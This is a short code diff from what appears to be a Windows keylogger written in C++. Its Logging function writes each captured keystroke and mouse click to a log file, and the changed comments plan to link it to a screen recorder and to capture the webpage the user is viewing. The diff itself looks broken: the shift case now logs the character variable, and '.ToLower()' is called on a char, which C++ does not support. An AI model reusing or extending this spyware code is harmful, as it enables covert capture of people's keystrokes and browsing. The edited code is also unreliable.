@@ -29,7 +29,7 @@ void Logging(){
                         log << "\n";//go to next line
                         break;
                     case VK_SHIFT:
-                        log << "[shift]";
+                        log << c;
                         break;
                     case VK_CONTROL:
                         log << "[control]";
@@ -49,7 +49,7 @@ void Logging(){
                         log << "Rclick";
                         break;
                     default:
-                        log << c;
+                        log << c.ToLower();
                 }
                 log.close();
             }
@@ -57,4 +57,4 @@ void Logging(){
     }
 }
 //tie in with screen recorder
-//put data into log
+//Find a way to get webpage that user is looking at
